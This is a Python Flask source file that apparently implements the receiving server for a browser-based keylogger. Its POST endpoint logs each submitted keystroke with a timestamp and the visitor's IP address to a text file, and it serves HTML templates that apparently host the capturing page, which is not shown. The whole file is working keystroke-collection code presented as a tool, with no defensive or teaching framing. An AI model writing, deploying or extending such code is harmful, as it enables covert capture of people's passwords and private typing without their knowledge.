from flask import Flask, request, render_template
from flask_restful import Api, Resource
from flask_restful.reqparse import RequestParser
from datetime import datetime
import os

HOST_ADDR = os.getenv('LTK_HOST_ADDR') or '0.0.0.0'
HOST_PORT = int(os.getenv('LTK_HOST_PORT') or 5000)
LOGFILE = os.getenv('LTK_LOGFILE') or 'client-keylog.txt'

app = Flask(__name__)
api = Api(app)

post_args = RequestParser()
post_args.add_argument('key', type=str, help='The key to log.', required=True)
post_args.add_argument('time', type=float,
                       help='The timestamp at which the key was pressed.',
                       required=True)


def log_key(time, ip, key):
    log = '[{}] - {} - {}'.format(time, ip, key)
    with open(LOGFILE, 'a') as logfile:
        logfile.write(log + '\n')


class KeylogHandler(Resource):
    def post(self):
        args = post_args.parse_args()
        log_key(
            datetime.fromtimestamp(args['time']).strftime(
                '%m/%d/%Y %H:%M:%S.%f'),
            request.environ['REMOTE_ADDR'],
            args['key'],
        )


api.add_resource(KeylogHandler, '/')


@app.route('/')
def root():
    return render_template('index.html')


@app.route('/void')
def void():
    return render_template('void.html')


if __name__ == '__main__':
    app.run(HOST_ADDR, HOST_PORT)
